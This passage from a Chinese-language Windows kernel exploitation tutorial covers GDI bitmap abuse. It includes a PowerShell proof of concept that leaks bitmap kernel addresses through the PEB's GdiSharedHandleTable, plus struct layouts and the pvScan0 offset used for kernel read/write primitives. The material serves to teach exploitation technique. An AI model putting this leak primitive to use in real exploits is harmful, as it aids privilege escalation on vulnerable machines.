@@ -1,0 +1,372 @@
+
+有了指向`GdiSharedHandleTable`数组的指针，我们所需要做的就是按结构体尺寸的倍数（64位为`0x18`）增加结构体的索引。
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_35GP56YYWEDZPF3.jpg)
+
+[`Process hacker`](https://bbs.kanxue.com/elink@0f8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8J5L8$3y4W2M7%4y4Z5j5h3y4C8k6i4u0Q4x3X3g2K6L8%4g2J5j5$3g2X3L8%4u0Y4k6g2)9J5k6h3&6W2N6q4)9J5c8R3`.`.)有一个非常有用的特性来列出`GDI`对象句柄。我们可以用它来证实在`KD`中找到的值。
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_UXUFA85HTV5AT8D.jpg)
+
+很棒！我们需要通过重新来采集两个`bitmap`的信息（`manager+worker`）。如我们可以看到的，在`bitmap`句柄上仅仅是做一些简单的数学运算。唯一的问题在于我们要如何拿到进程`PEB`的基地址。幸运的是，未文档化的`NtQueryInformationProcess`函数可以解决这个问题。当使用`ProcessBasicInformation`类(`0x0`)来调用该函数时，它会返回一个包含`PEB`基地址的结构体。在这里，我不会进一步描述更多的细节，毕竟这是个妇孺皆知的技巧。下面的`POC`会清理掉任何疑点！
+
+``` 
+Add-Type -TypeDefinition @"
+
+using System;
+
+using System.Diagnostics;
+
+using System.Runtime.InteropServices;
+
+using System.Security.Principal;
+
+
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct _PROCESS_BASIC_INFORMATION
+
+{
+
+    public IntPtr ExitStatus;
+
+    public IntPtr PebBaseAddress;
+
+    public IntPtr AffinityMask;
+
+    public IntPtr BasePriority;
+
+    public UIntPtr UniqueProcessId;
+
+    public IntPtr InheritedFromUniqueProcessId;
+
+}
+
+
+
+/// Partial _PEB
+
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+
+public struct _PEB
+
+{
+
+    [FieldOffset(148)]
+
+    public IntPtr GdiSharedHandleTable32;
+
+    [FieldOffset(248)]
+
+    public IntPtr GdiSharedHandleTable64;
+
+}
+
+
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct _GDI_CELL
+
+{
+
+    public IntPtr pKernelAddress;
+
+    public UInt16 wProcessId;
+
+    public UInt16 wCount;
+
+    public UInt16 wUpper;
+
+    public UInt16 wType;
+
+    public IntPtr pUserAddress;
+
+}
+
+
+
+public static class EVD
+
+{
+
+    [DllImport("ntdll.dll")]
+
+    public static extern int NtQueryInformationProcess(
+
+        IntPtr processHandle, 
+
+        int processInformationClass,
+
+        ref _PROCESS_BASIC_INFORMATION processInformation,
+
+        int processInformationLength,
+
+        ref int returnLength);
+
+
+
+    [DllImport("gdi32.dll")]
+
+    public static extern IntPtr CreateBitmap(
+
+        int nWidth,
+
+        int nHeight,
+
+        uint cPlanes,
+
+        uint cBitsPerPel,
+
+        IntPtr lpvBits);
+
+}
+
+"@
+
+
+
+#==============================================[PEB]
+
+
+
+# Flag architecture $x32Architecture/!$x32Architecture
+
+if ([System.IntPtr]::Size -eq 4) {
+
+    echo "`n[>] Target is 32-bit!"
+
+    $x32Architecture = 1
+
+} else {
+
+    echo "`n[>] Target is 64-bit!"
+
+}
+
+# Current Proc handle
+
+$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
+
+# Process Basic Information
+
+$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
+
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+
+$returnLength = New-Object Int
+
+$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
+
+# PID & PEB address
+
+echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
+
+if ($x32Architecture) {
+
+    echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
+
+} else {
+
+    echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
+
+}
+
+# Lazy PEB parsing
+
+$_PEB = New-Object _PEB
+
+$_PEB = $_PEB.GetType()
+
+$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
+
+$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
+
+$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
+
+# GdiSharedHandleTable
+
+if ($x32Architecture) {
+
+    echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
+
+} else {
+
+    echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
+
+}
+
+# _GDI_CELL size
+
+$_GDI_CELL = New-Object _GDI_CELL
+
+$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
+
+
+
+#==============================================[/PEB]
+
+
+
+#==============================================[Bitmap]
+
+
+
+echo "`n[>] Creating Bitmaps.."
+
+
+
+# Manager Bitmap
+
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+
+$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+
+echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
+
+if ($x32Architecture) {
+
+    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+
+    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+
+    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+
+} else {
+
+    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+
+    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+
+    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+
+}
+
+
+
+# Worker Bitmap
+
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+
+$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+
+echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
+
+if ($x32Architecture) {
+
+    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+
+    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+
+    echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+
+} else {
+
+    $HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+
+    echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+
+    echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+
+}
+
+
+
+#==============================================[/Bitmap]
+
+```
+![](https://bbs.kanxue.com/upload/attach/201803/530966_3AY2REV8YGHFU8Q.jpg)
+
+注意到我们的脚本是架构独立的！其中的一个疑题解决掉了，但是我们为什么要关心这些`bitmap`对象呢？
+
+泄露出来的`bitmap`内核地址在内核空间中指向了下面的`GDI` `baseobject`结构。
+
+``` 
+/// 32bit size: 0x10
+
+/// 64bit size: 0x18
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct _BASEOBJECT
+
+{
+
+    public IntPtr hHmgr;
+
+    public UInt32 ulShareCount;
+
+    public UInt16 cExclusiveLock;
+
+    public UInt16 BaseFlags;
+
+    public UIntPtr Tid;
+
+}
+
+```
+
+我们对此并无多大兴趣，如果你想要了解更多关于`baseobject`的信息，请参考`ReactOS` `wiki` `here.` 在这一头部之后，有一个特定的结构体，它的类型取决于该对象的类型。对于`bitmaps`来说，这是个 [`surface object`](https://bbs.kanxue.com/elink@02eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7$3c8F1i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8X3I4A6j5Y4u0S2M7Y4W2Q4x3V1k6X3k6U0f1$3z5e0V1H3x3g2)9J5k6h3q4K6M7s2R3`.) 结构体。
+
+``` 
+/// 32bit size: 0x34
+
+/// 64bit size: 0x50
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct _SURFOBJ
+
+{
+
+    public IntPtr dhsurf;
+
+    public IntPtr hsurf;
+
+    public IntPtr dhpdev;
+
+    public IntPtr hdev;
+
+    public IntPtr sizlBitmap;
+
+    public UIntPtr cjBits;
+
+    public IntPtr pvBits;
+
+    public IntPtr pvScan0; /// offset => 32bit = 0x20 & 64bit = 0x38
+
+    public UInt32 lDelta;
+
+    public UInt32 iUniq;
+
+    public UInt32 iBitmapFormat;
+
+    public UInt16 iType;
+
+    public UInt16 fjBitmap;
+
+}
+
+```
+
+`pvScan0`成员就是我们想要的！这一成员是一个指针，指向`bitmap`的首个扫描行。从泄露出来的内核地址我们可以计算出该成员的偏移。
+
+``` 
+# 32 bit
+
+[IntPtr]pvScan0_32 = $pKernelAddress + 0x30
+
+
+
+# 64 bit
+
+[IntPtr]pvScan0_64 = $pKernelAddress + 0x50
+```
